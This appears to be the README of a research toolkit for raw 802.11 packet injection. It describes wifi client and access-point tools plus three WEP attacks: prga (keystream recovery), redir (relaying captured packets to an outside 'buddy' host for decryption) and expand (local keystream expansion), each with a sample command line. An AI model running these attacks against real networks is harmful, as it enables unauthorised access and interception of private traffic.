This is a collection of tools that use raw 802.11 packet injection.
None of the tools configure the interface, so be sure to run something
like:

ifconfig wlan create wlandev ath0 wlanmode ahdemo channel 7 promisc up

beforehand.  The following tools are found here:

assoc	A wifi client.
ap	A wifi access point.

prga	Gives ability to transmit on a WEP network.
redir	Gives ability to decrypt in real-time on a WEP network, via Internet.
expand	Gives ability to decrypt locally on a WEP network.

All these tools depend on:

libw00t	Utility functions used by all tools.

Detailed explanation of tools.
==============================

assoc:

Acts as a wifi client.  It will associate to a network and bind a
tap interface to it.  The interface may be used like a standard eth
interface attached to a normal LAN.  Multiple instances of the
program may be run in order to connect to multiple APs simultaneously.
Example:

./assoc -s w00t -t tap0
ifconfig tap0 192.168.0.123 up
ping 192.168.0.1

ap:

The same as assoc, but acts as an access point.  Example:

./ap -s w00t -t tap1
ifconfig tap1 192.168.0.1 up
tcpdump -n -i tap1

[For the next set of tools, refer to http://tapir.cs.ucl.ac.uk/bittau-wep.pdf
for theoretical information.]

prga:

Sniff a packet on a WEP network and obtain a keystream.  It binds
to a tap interface which may be used to TX packets on that network.
Example:

./prga -b bssid_of_network -t tap0
ifconfig tap0 192.168.0.123 up
ping 192.168.0.1

redir:

Resend WEP packets to our buddy on the Internet.  The buddy will
receive the clear-text and send it back to us via a UDP socket.
This data is then fed back into a tap interface.  This way, data
may be ultimately be read from the tab iface in clear-text.  Example:

[Box on Internet]~# ./buddy
./redir -d buddy_ip -b bssid -t tap0 -r wifi_rtr_mac -s wifi_src_ip -p 666
ifconfig tap0 up
tcpdump -n -i tap0

expand:

Sniff a WEP packet and do the linear keystream expansion trick to
decrypt it.  The clear-text packet is sent to a tap interface.
Example:

./expand -b bssid -t tap0
ifconfig tap0 up
tcpdump -n -i tap0
